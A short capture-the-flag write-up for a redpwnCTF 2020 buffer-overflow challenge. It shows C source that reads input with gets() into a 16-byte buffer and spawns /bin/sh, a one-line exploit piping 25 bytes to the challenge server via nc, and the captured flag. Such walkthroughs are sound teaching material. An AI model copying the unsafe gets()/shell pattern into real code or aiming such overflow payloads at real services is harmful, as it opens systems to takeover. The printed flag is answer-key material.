# coffer-overflow-0

> Can you fill up the coffers? We even managed to find the source for you.


> nc 2020.redpwnc.tf 31199


Files provided:
* coffer-overflow-0.c  -  C source code
* coffer-overflow-0   - 64bit ELF file

C source code:
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code != 0) {
    system("/bin/sh");
  }
}
```

Our goal is to make the condition `code != 0` true, in order to execute the code contained in the if:
```c
    system("/bin/sh");
``` 
So, we have to modify the variable `code`.
To do this, we can cause a buffer overflow, as we can overwrite the memory beyond the name limits.
To modify `code` we have to enter at least 25 chars. 
```sh
$   ( python -c "print 'A'*25"; cat ) | nc 2020.redpwnc.tf 31199
```

And here is the flag: `flag{b0ffer_0verf10w_3asy_as_123}`
